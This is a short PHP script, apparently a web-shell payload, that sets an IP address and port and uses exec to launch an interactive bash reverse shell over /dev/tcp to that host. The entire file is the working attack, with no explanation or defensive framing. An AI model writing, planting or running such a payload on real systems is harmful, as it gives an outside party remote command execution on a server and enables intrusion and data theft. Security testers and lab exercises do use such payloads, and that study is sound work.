<?php
$ip = "10.0.17.22";
$port = "4449";
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
